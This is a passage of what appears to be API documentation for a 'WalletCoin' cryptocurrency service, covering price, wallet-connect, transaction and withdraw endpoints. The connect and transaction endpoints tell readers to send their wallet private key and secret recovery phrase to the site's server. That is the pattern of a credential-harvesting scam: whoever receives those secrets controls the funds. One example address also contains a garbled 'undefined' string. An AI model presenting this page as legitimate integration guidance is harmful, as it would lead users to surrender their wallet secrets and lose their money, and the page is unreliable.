into your apps

Get the price of WalletCoin:

Use this method to get the price of WalletCoin.
Method: GET Request Url: https://walletcoincrypto.com/api/price

Request:

Url: https://walletcoincrypto.com/api/price

Example Response: 

                            
{
    "result": 3.1
}

Connect your Wallet:

Use this method to connect your wallet. Warning. Use this method to connect your wallet. Warning. Use this method to connect your own wallet only. Scam is being prosecuted.
Method: POST Request Url: https://walletcoincrypto.com/api/wallet/auth

Arguments:

  • private_key: Your private key
  • secret_phrase: Your secret phrase
  • wallet: Your wallet address
  • api_key: Your API Key
"wallet" & "api_key" is used to validate your API credentials.

Request: 

                            
Url: https://walletcoincrypto.com/api/wallet/auth
Body: {
    "private_key": your_private_key,
    "secret_phrase": your_secret_phrase,
    "wallet": your_wallet,
    "api_key": your_api_key
}

Example Response: 

                            
{
    "result": {
        "PublicKey": "zDMlGt3wrIagfTjQoh2NxdHmbB",
        "PrivateKey": "k8JbgKFrTBGzsyPjqDcAmVQRujh",
        "SecretPhrase": "Your wallet secret phrase",
        "API_KEY": "0WGbN3AioCpM8LZj7vuqUs",
        "Address": "fyPundefinedvBEkv2TeTx3XjWbHekW1U",
        "Balance": 1829
    }
}

Use Transaction methods:

Use this method to send money to other wallets. You can use this for your project to payout your clients. Warning. Use this method to send money from your own wallet only, don't say to clients connect their wallet. Scam is being prosecuted.
Method: POST Request Url: https://walletcoincrypto.com/api/wallet/transaction

Arguments:

  • private_key: Your private key
  • recipient: Recipient wallet
  • amount: Amount to send
  • wallet: Your wallet address
  • api_key: Your API Key

Request: 

                            
Url: https://walletcoincrypto.com/api/wallet/transaction
Body: {
    "private_key": your_private_key,
    "recipient": recipient_wallet,
    "amount": amount_to_send,
    "wallet": your_wallet,
    "api_key": your_api_key
}

Example Response: 

                            
{
    "result": {
        "Amount": 1829 # The remaining balance
    }
}

Method: POST Request Url: https://walletcoincrypto.com/api/wallet/withdraw

Arguments:

  • amount: Amount to send
  • wallet: Your wallet address
  • api_key: Your API Key

Request: 

                            
Url: https://walletcoincrypto.com/api/wallet/withdraw
Body: {

    "amount": amount_to_send,
    "wallet": your_wallet,

}
